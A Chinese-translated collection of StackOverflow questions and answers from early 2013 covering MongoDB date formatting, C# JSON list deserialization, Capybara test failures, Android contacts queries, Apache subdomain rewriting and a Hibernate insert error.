# StackOverflow 问答 14111000-14111999

# mongodb - mongodb中的日期格式可能是yyyy/mm/dd/hh/mm/ss？

> ID：14111000
> 
> 赞同：0
> 
> 时间：2013-01-01T13:47:14.147
> 
> 标签：mongodb, date, format

我用 node.js 和 mongodb 开发了一个应用程序。

我认为这个问题也可以在 javascript 中找到。如何将日期格式转换为我想要的方式，

喜欢`yyyy/mm/dd/hh/mm/ss`？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T13:54:19.613

```
> var a = new Date()
> a
ISODate("2013-01-01T13:50:36.839Z")
> a.getFullYear() + "/" + (a.getMonth() + 1) + "/" + a.getDate() + "/" + a.getHours() + "/" + a.getMinutes() + "/" + a.getSeconds()
2013/1/1/16/50/36 
```

可以使用字符串格式化方法改进代码。另外，看看[这个](https://stackoverflow.com/questions/11486779/formatting-isodate-from-mongodb)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-08-24T19:09:46.230

yearMonthDay: { $dateToString: { 格式: "%Y-%m-%d-%H-%M", 日期: {$subtract:["$cdt",14400000]}}}

这就是您获得所有不同格式的方法 [![日期格式](../Images/da9e0d1a6d19a25a31d38b4da4aa7fc5.png)](https://i.stack.imgur.com/RQ1Xo.jpg)

# list - c#4 反序列化JSON复杂对象列表

> ID：14111001
> 
> 赞同：0
> 
> 时间：2013-01-01T13:47:25.397
> 
> 标签：list, c#-4.0, serialization

新年快乐 ：-）

我有以下 JSON 对象：

```
{
\"OutcomeSummaryID\":105,
\"DeliveryDetailsID\":9,
\"AttemptedDeliveryModesIDList\":[1,5],
} 
```

我正在使用以下方法对其进行反序列化：

```
private void SerializeModel<T>(IDictionary<string, object> dataModel, T myModel)
    {
        Type sourceType = typeof(T);
        foreach (PropertyInfo propInfo in (sourceType.GetProperties()))
        {
            if (dataModel.ContainsKey(propInfo.Name))
            {
                //  if an empty string has been returned don't change the value
                if (dataModel[propInfo.Name].ToNullSafeString() != String.Empty)
                {
                    try
                    {
                        Type localType = propInfo.PropertyType;
                        localType = Nullable.GetUnderlyingType(localType) ?? localType;                            
                        propInfo.SetValue(myModel, Convert.ChangeType(dataModel[propInfo.Name], localType), null);                            
                    }
                    catch (Exception e)
                    {
                        //  ToDo: log serialize value errors
                    }

                }
            }
        }
    } 
```

模型定义为：

```
public class DeliveryDetailsView
{
    public int OutcomeSummaryID { get; set; }
    public int DeliveryDetailsID { get; set; }
    public List<int> AttemptedDeliveryModesIDList { get; set; }
} 
```

当我运行时，会出现以下异常：

```
System.InvalidCastException was caught
Message=Object must implement IConvertible. 
```

这是一个较大项目的摘录，我在其他地方广泛使用过这种方法，但这是第一次将列表作为字段，我看不出有什么干净的方法可以解决这个问题。我可以使用

```
if (localType.IsCollectionType()) 
```

但不知道在那之后从哪里继续。（谷歌的答案似乎都不适合这种情况，而且大多数都与 XML 有关）。

提前致谢。

**更新**

感谢下面的@Cube，我现在有了部分答案。

```
 if (localType.IsGenericType && localType.GetGenericTypeDefinition().Equals(typeof(List<>)))
{   
    Type localListType = localType.GetGenericArguments()[0];
    if (localListType.Equals(typeof(int)))
    {
        IDictionary<string, object> dataItem = (Dictionary<string, object>)dataModel[propInfo.Name];
        List<int> tempList = new List<int>();
        foreach (var item in dataItem)
        {
            tempList.Add((int)item.Value);
        }
        propInfo.SetValue(perinatalModel, tempList,  null);
    }
} 
```

...但是，所有将 JSON 数组转换为 List 的尝试都失败了。我也尝试过

```
List<int> tempList = (List<int>)dataModel[propInfo.Name]; 
```

两者都抛出异常

```
Unable to cast object of type 'System.Object[]' ... 
```

任何进一步的想法

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:03:35.367

前段时间我遇到了类似的问题。我不得不像这样以特殊的方式对待非原始类型：

```
if (t.IsGenericType && t.GetGenericTypeDefinition().Equals(typeof(List<>)))
{
    Type u = t.GetGenericArguments()[0];
    if (u.Equals(typeof(int)))
       // now dealing with List<int>
...
} 
```

希望这个简短的片段有所帮助。

**更新**更新：

```
if (localListType.Equals(typeof(int)))
{
    object[] dataItem = (object[])dataModel[propInfo.Name];
    List<int>tempList = new List<int>();
    foreach(object probablyInteger in dataItem)
        tempList.Add(Convert.ToInt32(probablyInteger));
    propInfo.SetValue(perinatalModel, tempList,  null);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T13:52:37.790

您可以尝试使用以下代码

```
public List<int> AttemptedDeliveryModesIDList { get; set; } 
```

和

```
public int[] AttemptedDeliveryModesIDList { get; set; } 
```

我还没有尝试过代码。所以我不是 100% 确定

# ruby-on-rails-3 - Capybara::ElementNotFound: 错误

> ID：14111002
> 
> 赞同：1
> 
> 时间：2013-01-01T13:47:29.043
> 
> 标签：ruby-on-rails-3, ruby-on-rails-3.2, railstutorial.org

我正在关注 railstutorial.org 教程我收到以下错误

```
 1) User pages signup with valid information should create a user
     Failure/Error: fill_in "password" , with: "foobar"
     Capybara::ElementNotFound:
       cannot fill in, no text field, text area or password field with id, name, or label 'password' found
     # (eval):2:in `fill_in'
     # ./spec/requests/user_pages_spec.rb:32:in `block (4 levels) in <top (required)>'

  2) Authentication signin with invalid information 
     Failure/Error: before { click_button "Sign in" }
     Capybara::ElementNotFound:
       no button with value or id or text 'Sign in' found
     # (eval):2:in `click_button'
     # ./spec/requests/authentication_pages_spec.rb:14:in `block (4 levels) in <top (required)>'

  3) Authentication signin with invalid information 
     Failure/Error: before { click_button "Sign in" }
     Capybara::ElementNotFound:
       no button with value or id or text 'Sign in' found
     # (eval):2:in `click_button'
     # ./spec/requests/authentication_pages_spec.rb:14:in `block (4 levels) in <top (required)>'

  4) Authentication signin with invalid information after visiting another page 
     Failure/Error: before { click_button "Sign in" }
     Capybara::ElementNotFound:
       no button with value or id or text 'Sign in' found
     # (eval):2:in `click_button'
     # ./spec/requests/authentication_pages_spec.rb:14:in `block (4 levels) in <top (required)>'

Finished in 3.67 seconds
46 examples, 4 failures 
```

和我的 authentication_pages_spec.rb

```
require 'spec_helper'

describe "Authentication" do

  subject { page }

  describe "signin page" do
    before { visit signin_path }
    it { should have_selector('h1', text: 'Sign in') }
    it { should have_selector('title', text: 'Sign in') }
  end

  describe "signin" do
    before { visit signin_path }
    describe "with invalid information" do
      before { click_button "Sign in" }
      it { should have_selector('title', text: 'Sign in') }
      it { should have_selector('div.alert.alert-error', text: 'Invalid') }
      describe "after visiting another page" do
        before { click_link "Home" }
        it { should_not have_selector('div.alert.alert-error') }
      end
    end

    let(:user) { FactoryGirl.create(:user) }
    before do
      fill_in "Email", with: user.email
      fill_in "Password", with: user.password
      click_button "Sign in"
    end

    it{should have_selector('title', text: user.name) }
    it{should have_link('Profile', href:user_path(user))}
    it{should have_link('Sign out',href: signout_path)}
    it{should_not have_link('Sign in',href: signin_path)}
  end
end 
```

和 app/view/sessions/new.html.erb

```
<% provide(:title, "Sign in") %>
<h1>Sign in</h1>
<div class="row">
  <div class="span6 offset3">
    <%= form_for(:session, url: sessions_path) do |f| %>
      <%= f.label :email %>
      <%= f.text_field :email %>
      <%= f.label :password %>
      <%= f.password_field :password %>
      <%= f.submit "Sign in", class: "btn btn-large btn-primary" %>
    <% end %>
    <p>New user? <%= link_to "Sign up now!", signup_path %></p>
  </div>
</div> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-07T14:43:44.837

您缺少描述块。使您的代码如下所示：

```
require 'spec_helper'

describe "Authentication" do
  subject { page }

  describe "signin page" do
    before { visit signin_path }
    it { should have_selector('h1', text: 'Sign in') }
    it { should have_selector('title', text: 'Sign in') }
  end

  describe "signin" do
    before { visit signin_path }
    describe "with invalid information" do
      before { click_button "Sign in" }
      it { should have_selector('title', text: 'Sign in') }
      it { should have_selector('div.alert.alert-error', text: 'Invalid') }
      describe "after visiting another page" do
        before { click_link "Home" }
        it { should_not have_selector('div.alert.alert-error') }
      end
    end

    # The following block is missing
    describe "with valid information" do
      let(:user) { FactoryGirl.create(:user) }
      before do
        fill_in "Email", with: user.email
        fill_in "Password", with: user.password
        click_button "Sign in"
      end

      it {should have_selector('title', text: user.name) }
      it {should have_link('Profile', href:user_path(user))}
      it{should have_link('Sign out',href: signout_path)}
      it{should_not have_link('Sign in',href: signin_path)}
     end
  end
end 
```

Capybara 通常`visit`会先让你使用它的方法，然后才会让你使用它的`fill_in`方法。您忘记了将最终`before`块包装在一个`describe`块中，就像我在上面所做的那样，因此 before 块中的代码实际上覆盖了使用 visit 方法的前一个 before 块。所以这就是你有这个问题的原因。通过将最后一组断言包装在描述块中，您可以解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-02T01:05:32.697

看起来事情在 1) 中开始出错，我相信这实际上是在 spec/requests/user_pages_spec.rb 文件中处理的。你能张贴你在那里的东西吗？此外，根据您在教程中的位置，您可能会丢失一些 authentication_pages_spec.rb 文件，因为[http://ruby.railstutorial.org/chapters/sign-in-sign-out#sec-下的清单 8.6 signin_tests](http://ruby.railstutorial.org/chapters/sign-in-sign-out#sec-signin_tests)有工厂女孩调用和以下由描述块包围的“it”子句。

# android - 查询联系人 uri 时为空光标

> ID：14111003
> 
> 赞同：2
> 
> 时间：2013-01-01T13:47:33.550
> 
> 标签：android, uri, android-contacts, contactscontract

我的小测试应用程序使用联系人选择器选择一个联系人：

```
 final Intent contactPickerIntent = new Intent(Intent.ACTION_PICK,
            android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
    startActivityForResult(contactPickerIntent, PICK_CONTACT); 
```

在 onActivityResult 方法中，我解析结果，它类似于`content://com.android.contacts/data/7557`. 然后我查询此 uri 以获取其名称和查找键：

```
final String[] projection = new String[] {
    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
    ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY };
final Cursor c = getContentResolver().query(contactUri, projection, null, null, null);
if (c.moveToFirst()) {
    final String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
    final String lookupKey = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY));
    Log.d(TAG, "picked contact, name: " + name + ", lookup key: " + lookupKey);
} 
```

它工作正常，但不适用于某些联系人。某些联系人会导致光标为空。我检查了其他问题。这似乎在[查询联系人时遇到了同样的问题——有时返回空光标](https://stackoverflow.com/questions/13823097/android-querying-contacts-sometimes-returns-empty-cursor)（但没有答案）。我尝试了这个问题中提出的解决方案的方法，[Retrieve Contact Phone Number From URI in Android](https://stackoverflow.com/questions/3370628/retrieve-contact-phone-number-from-uri-in-android)：

```
final String id = contactUri.getLastPathSegment();
final String[] whereArgs = new String[] { id };
final Cursor c2 = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
    ContactsContract.CommonDataKinds.Phone._ID + " = ?", whereArgs, null);
if (c2.moveToFirst()) {
    final String name = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
    final String lookupKey = c.getString(c.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LOOKUP_KEY));
} 
```

但不幸的是，问题仍然存在：某些联系人会导致光标为空。我究竟做错了什么？感谢任何人的帮助。

# java - 在 x 轴上使用日期时间格式时标签过多

> ID：14111007
> 
> 赞同：0
> 
> 时间：2013-01-01T13:48:18.013
> 
> 标签：java, android, teechart

向系列添加`DateTime`值时`Area`，标签会重复，如下所示。你如何避免这种怪异现象？

![3 个值，6 个标签](../Images/f9fd15f041688a3454a6325f592d4e52.png)

应该是“31/12/2012”和“01/01/2013”​​。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T11:26:29.113

您应该为底部轴设置一个 DateTime 增量，如教程 4 中所述：

```
tChart1.getAxes().getBottom().setIncrement(Utils.getDateTimeStep(DateTimeStep.ONEDAY)); 
```

教程可以在 TeeChart 文件中包含的所谓文件夹中找到。

# xml - 有没有办法（json/xml）将内容从 3rd 方站点导入到单独的 WP 帖子中？

> ID：14111009
> 
> 赞同：-2
> 
> 时间：2013-01-01T13:48:27.667
> 
> 标签：xml, json, import, wordpress

正如任何人有任何经验吗？试图做同样的事情？

非常感谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T15:41:14.553

我发现的是这个，这是我现在的答案：SupraCSV Wp Ultimate CSV CSV to Post

如果你知道别的，我想听听.. 非常感谢！

# php - Apache - 重写动态子域和 URL 参数

> ID：14111014
> 
> 赞同：0
> 
> 时间：2013-01-01T13:49:33.473
> 
> 标签：php, apache, mod-rewrite, url-rewriting

我对 Apache2 中的重写条件和规则有疑问。我想要动态子域和动态文件夹，它们将重写为 php 脚本。例如：

```
sub1.example.com/folder1  => do.php?a=sub1&b=folder1
sub2.example.com/folder2  => do.php?a=sub1&b=folder2 
```

看起来每个子域都有自己的文件夹。但是某些子域（管理员等）不会被重写。

我知道如何重写子域：

```
RewriteEngine On
RewriteCond %{HTTP_HOST} ^(^.*)\.example.com/ [NC]
RewriteRule ^(.*)$ do.php?a=%1 [L,P] 
```

但我不知道，如何在子域中做动态文件夹。

非常感谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T14:46:55.447

也许这个例子可以帮助你：

```
RewriteEngine On
RewriteCond &#37;{HTTP_HOST} !^www\.example\.com$ [NC]
RewriteCond %{HTTP_HOST} ^([a-zA-Z0-9]+)\.example\.com$ [NC]
RewriteCond %{REQUEST_URI} !^/?do\.php$
RewriteRule .? do.php?url=%1&path=%{REQUEST_URI} [L,QSA] 
```

# javascript - .net ajax 工具包等的使用

> ID：14111015
> 
> 赞同：0
> 
> 时间：2013-01-01T13:49:47.990
> 
> 标签：javascript, jquery, asp.net

我刚刚开始使用 Ajax/ws，我遇到了这个问题：

如果微软开始实现 Jquery/java-script 为什么我必须使用微软的 ajax 工具包

各有什么好处？（微软还支持 ajax 工具吗？）

我知道 Java-script 是一种客户端语言，并且通过几种方法我可以使用 java-script 与服务器进行通信。

Microsoft ajax 工具包包含很多我可以下载的插件，以及一个示例

Microsoft ajax -> 日期日历 VS Jquery-> 日期选择器。

也许我遗漏了一些东西，使用脚本管理器 -> 更新面板有什么好处？

哪种方法是“正确”的？

我知道每个人都应该探索和使用他们最方便的那个。

但对于那些在该领域“缺乏”经验的人来说，

最好的起点在哪里？

欣赏关于这个主题的任何“方向”和一些理论？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:16:03.190

您的问题的一些答案：

*   Microsoft ajax 控件工具包已过时。它很重，难以扩展，只用于 Web Form，有时会导致奇怪的问题

*   微软还没有开发 jquery。他们只是在 Visual Studio 中支持 JQuery。我可以向你保证，一旦你掌握了 JQuery（不是那么难而且很容易开始），你会发现你永远不需要像 Ajax 控制工具包或 Telerik 这样的东西。您可以在客户端完成或自定义大部分内容。

*   如果您不熟悉 ASP.Net 和 Ajax，那么 Web 窗体、脚本管理器和更新面板可能是实现结果的快速方法。但从长远来看，我认为你应该学习 MVC、JQuery、KnockoutJs。他们现在很热:-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:06:56.547

我建议不要打扰 Microsoft Ajax Toolkit。我相信这是现在的老学校了。使用 jquery、jquery ui 或任何其他客户端 JavaScript 工具包，例如 dojo、kendoui 等，并将其与您的 ASP.Net 应用程序集成。这将为您提供最大的灵活性。

MS AJAX 工具包提供的是一组服务器端控件，可以轻松拖放到表单设计器中。这些控件然后生成一些客户端 html + javascript 来启用所有灵活的行为，就像它与其他 ASP.Net 服务器控件一样。

如果我可以建议开始研究 ASP.Net MVC。你不会后悔的。

# python - 在 Django 中使用额外的 SortedDict

> ID：14111016
> 
> 赞同：0
> 
> 时间：2013-01-01T13:49:48.023
> 
> 标签：python, django, orm

我试图在 django 中的 select 语句中添加一个额外的字段，我想在其中使用不同的格式字符串。

以下结果：
**提供的绑定数量不正确。当前语句使用 3，并且提供了 4 个。**

```
select=SortedDict([(
    "groupkey", 
    "strftime('%s', datetime(time, 'utc'),'localtime')")]),
select_params=(
    "%m"
) 
```

这样我得到：使用 %m 作为格式字符串时
**，索引 19 处不受支持的格式字符 'm' (0x6d) 。**使用 %%m 作为格式字符串时它似乎有效，但我不认为这是一个很好的解决方案。

```
select={
    "groupkey":"strftime('" + self.__formatstring + "', datetime(time, 'utc'),'localtime')"
}) 
```

谢谢！

# sql - 如何使用 Powershell 查看哪些 sql server 数据库有维护计划？

> ID：14111018
> 
> 赞同：3
> 
> 时间：2013-01-01T13:49:53.917
> 
> 标签：sql, sql-server, powershell

我正在尝试使用 Powershell 找出哪些 sql server 数据库设置了维护计划，以便我可以将此信息导出到报告中。我一直在使用 gwmi 来检索同一份报告所需的其他信息。

我在谷歌上看过，但似乎找不到任何相关的东西。我不是 sql server 专家，所以我不确定维护计划是否有我可以搜索的文件，或者是否有任何其他使用 wmi 的方法。我正在从没有安装任何版本的 sql server 的工作站运行 powershell 脚本。

任何建议都会很棒

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-02T02:50:00.040

维护计划无法通过 SMO 访问，但如果它们在 SSIS 中实施，您可以查看这些包。看看[这里](http://www.dbnewsgroups.net/sqlprogramming/t20876-programatically-accessing-maintenance-plans-through-smo.aspx)和[这里](http://social.msdn.microsoft.com/Forums/en-US/sqlintegrationservices/thread/3593d7df-4880-43e2-8276-57dd340d1663)。

如果您以前从未涉足过此类事情，那么您可能希望有一位经验丰富的 DBA 指导您完成它，至少一开始是这样。

# android - 在 Android 中使用 Google Maps API v2 添加图像

> ID：14111019
> 
> 赞同：2
> 
> 时间：2013-01-01T13:50:04.277
> 
> 标签：android, google-maps

![在此处输入图像描述](../Images/245725151b4527443fbc41f732882576.png)如何使用 Google Maps API 在 Google Maps 中的特定位置设置图像并处理其点击侦听器？请提供一步一步的解决方案？注意：我不是在谈论标记。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-03T20:26:16.813

我相信实现这一点的最简单方法是仍然使用标记，但设置自定义图标。

像这样的东西应该工作： `photoMarker = mMap.addMarker(new MarkerOptions().position(photoLatLng).icon(BitmapDescriptorFactory.fromResource(R.drawable.photo)));`

[请参阅此处](https://developers.google.com/maps/documentation/android/reference/com/google/android/gms/maps/model/Marker)的文档。

# mysql - Spring + Hibernate + Mysql 在尝试更新/保存某些实体时抛出 SQLGrammarExeception。阅读工作正常

> ID：14111022
> 
> 赞同：1
> 
> 时间：2013-01-01T13:50:27.903
> 
> 标签：mysql, spring, hibernate

我正在使用*spring 3.1*和*hibernate 3.6*开发分类广告网站。我有四个实体（、`User`和`UserRole`）。我为每个班级使用单独的 dao。Daos 中的所有操作都可以正常工作。但是在and的 daos 中，保存/更新会抛出.`Advertisement``Category``User``UserRoles``Advertisement``Category``SQLGrammarException`

广告类

```
 @Entity
    @Table(name="ads")
    public class Advertisement implements Serializable {

        private static final long serialVersionUID = 1L;

        @Id
        @GeneratedValue
        @Column(name = "AD_ID")
        private String adId;

        @ManyToOne(cascade = CascadeType.ALL)
        @JoinColumn(name="CAT_ID" )
        private Category category;

        @ManyToOne(cascade = CascadeType.ALL)
        @JoinColumn(name="USER_ID" )
        private User user;

        @Column(name = "TITLE")
        private String title;

        @Column(name = "DESC", nullable = true)
        private String desc;

        @Column(name = "PRICE")
        private double price;

        @Column(name ="IMG1" , nullable = true)
        private String imageOne;

        @Column(name ="IMG2" , nullable = true)
        private String imageTwo;

        @Column(name ="IMG3" , nullable = true)
        private String imageThree;

        @Temporal(TemporalType.TIMESTAMP)
        @Column(name ="CREATED")
        private Date createdOn;

        //Getters and setters
    } 
```

类别类

```
 @Entity
    @Table(name="cats")
    public class Category implements Serializable {

        private static final long serialVersionUID = 1L;

        @Id
        @GeneratedValue
        @Column(name = "CAT_ID")
        private String catId;

        @Column(name = "CAT_NAME", unique=true)
        private String catName;

        @Column(name ="DESC" , nullable = true)
        private String desc;

        @OneToMany(mappedBy="category", fetch=FetchType.LAZY)
        private List<Advertisement> allAds;

        //getters and setters
    } 
```

广告道

```
 @Repository
    @Transactional
    public class AdvertisementDaoImpl implements AdvertisementDao {

        private HibernateTemplate hibernateTemplate;

        @Autowired
        public void setSessionFactory(SessionFactory sessionFactory) 
        {
            this.hibernateTemplate = new HibernateTemplate(sessionFactory);
        }

        @Override
        public void save(Advertisement ad) 
        {       
            hibernateTemplate.save(ad);

        }

        @Override
        public void update(Advertisement ad) {
            hibernateTemplate.update(ad);

        }

        @Override
        public void delete(Advertisement ad) {
          hibernateTemplate.delete(ad);

        }

        @Override
        public Advertisement getAdById(String adId) {

            Advertisement ad = (Advertisement) hibernateTemplate.get(Advertisement.class, adId);

            return ad;
        }

        @SuppressWarnings("unchecked")
        @Override
        public List<Advertisement> getAdsByUserId(String userId) {

            String sql = "SELECT * FROM ads USER_ID = :uID";

            List <Advertisement> adList= new ArrayList<Advertisement>();

            Query qry = hibernateTemplate.getSessionFactory().getCurrentSession().
                        createSQLQuery(sql)
                        .addEntity(Advertisement.class)
                        .setParameter("uID", userId);

            adList = ( List <Advertisement> ) qry.list();

            return adList;
        }

    } 
```

桌子

```
 CREATE TABLE IF NOT EXISTS `ads` (
          `AD_ID` int(10) unsigned NOT NULL AUTO_INCREMENT,
          `CAT_ID` int(10) unsigned NOT NULL,
          `USER_ID` int(10) unsigned NOT NULL,
          `TITLE` varchar(200) NOT NULL,
          `PRICE` double unsigned NOT NULL,
          `DESC` varchar(2000) DEFAULT NULL,
          `IMG1` varchar(400) DEFAULT NULL,
          `IMG2` varchar(400) DEFAULT NULL,
          `IMG3` varchar(400) DEFAULT NULL,
          `CREATED` timestamp NOT NULL,
          PRIMARY KEY (`AD_ID`),
          KEY `CAT_ID` (`CAT_ID`),
          KEY `USER_ID` (`USER_ID`)
        ) ENGINE=InnoDB DEFAULT CHARSET=latin1 AUTO_INCREMENT=1 ;
        ALTER TABLE `ads`
          ADD CONSTRAINT `ads_ibfk_2` FOREIGN KEY (`USER_ID`) REFERENCES `users` (`USER_ID`) ON DELETE CASCADE ON UPDATE CASCADE,
          ADD CONSTRAINT `ads_ibfk_1` FOREIGN KEY (`CAT_ID`) REFERENCES `categories` (`CAT_ID`) ON DELETE CASCADE ON UPDATE CASCADE; 
```

调用保存方法

```
 Advertisement ad2= new Advertisement();

            ad2.setCategory(categoryDao.getAllCategories().get(2));

            ad2.setUser(UserService.getCurrentUser());
            ad2.setImageOne(null);
            ad2.setImageTwo(null);
            ad2.setImageThree(null);

            ad2.setCreatedOn(new Date());

            ad2.setPrice(102.0);

            ad2.setTitle("New ad");

            ad2.setDesc("descriptions");
            advertisementDao.save(ad2); 
```

这是错误

```
 HTTP Status 500 - Request processing failed; nested exception is org.springframework.dao.InvalidDataAccessResourceUsageException: could not insert: [com.slclassifieds.adsonline.model.Advertisement]; SQL [insert into ads (CAT_ID, CREATED, DESC, IMG1, IMG3, IMG2, PRICE, TITLE, USER_ID) values (?, ?, ?, ?, ?, ?, ?, ?, ?)]; nested exception is org.hibernate.exception.SQLGrammarException: could not insert: [com.slclassifieds.adsonline.model.Advertisement]

            type Exception report

            message Request processing failed; nested exception is org.springframework.dao.InvalidDataAccessResourceUsageException: could not insert: [com.slclassifieds.adsonline.model.Advertisement]; SQL [insert into ads (CAT_ID, CREATED, DESC, IMG1, IMG3, IMG2, PRICE, TITLE, USER_ID) values (?, ?, ?, ?, ?, ?, ?, ?, ?)]; nested exception is org.hibernate.exception.SQLGrammarException: could not insert: [com.slclassifieds.adsonline.model.Advertisement]

            description The server encountered an internal error that prevented it from fulfilling this request.

            exception

            org.springframework.web.util.NestedServletException: Request processing failed; nested exception is org.springframework.dao.InvalidDataAccessResourceUsageException: could not insert: [com.slclassifieds.adsonline.model.Advertisement]; SQL [insert into ads (CAT_ID, CREATED, DESC, IMG1, IMG3, IMG2, PRICE, TITLE, USER_ID) values (?, ?, ?, ?, ?, ?, ?, ?, ?)]; nested exception is org.hibernate.exception.SQLGrammarException: could not insert: [com.slclassifieds.adsonline.model.Advertisement]
                org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:894)
                org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:778)
                javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
                javax.servlet.http.HttpServlet.service(HttpServlet.java:728)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:330)
                org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:118)
                org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:84)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:103)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:113)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:54)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:45)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.www.BasicAuthenticationFilter.doFilter(BasicAuthenticationFilter.java:150)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.AbstractAuthenticationProcessingFilter.doFilter(AbstractAuthenticationProcessingFilter.java:183)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:105)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:87)
                org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:342)
                org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:192)
                org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:160)
                org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:346)
                org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:259)
            root cause

            org.springframework.dao.InvalidDataAccessResourceUsageException: could not insert: [com.slclassifieds.adsonline.model.Advertisement]; SQL [insert into ads (CAT_ID, CREATED, DESC, IMG1, IMG3, IMG2, PRICE, TITLE, USER_ID) values (?, ?, ?, ?, ?, ?, ?, ?, ?)]; nested exception is org.hibernate.exception.SQLGrammarException: could not insert: [com.slclassifieds.adsonline.model.Advertisement]
                org.springframework.orm.hibernate3.SessionFactoryUtils.convertHibernateAccessException(SessionFactoryUtils.java:635)
                org.springframework.orm.hibernate3.HibernateAccessor.convertHibernateAccessException(HibernateAccessor.java:412)
                org.springframework.orm.hibernate3.HibernateTemplate.doExecute(HibernateTemplate.java:411)
                org.springframework.orm.hibernate3.HibernateTemplate.executeWithNativeSession(HibernateTemplate.java:374)
                org.springframework.orm.hibernate3.HibernateTemplate.saveOrUpdate(HibernateTemplate.java:737)
                com.slclassifieds.adsonline.dao.AdvertisementDaoImpl.save(AdvertisementDaoImpl.java:32)
                sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
                sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
                sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
                java.lang.reflect.Method.invoke(Method.java:601)
                org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:319)
                org.springframework.aop.framework.ReflectiveMethodInvocation.invokeJoinpoint(ReflectiveMethodInvocation.java:183)
                org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:150)
                org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:110)
                org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)
                org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)
                $Proxy27.save(Unknown Source)
                com.slclassifieds.adsonline.web.AdController.viewAdDetails(AdController.java:66)
                sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
                sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
                sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
                java.lang.reflect.Method.invoke(Method.java:601)
                org.springframework.web.method.support.InvocableHandlerMethod.invoke(InvocableHandlerMethod.java:213)
                org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:126)
                org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:96)
                org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:617)
                org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:578)
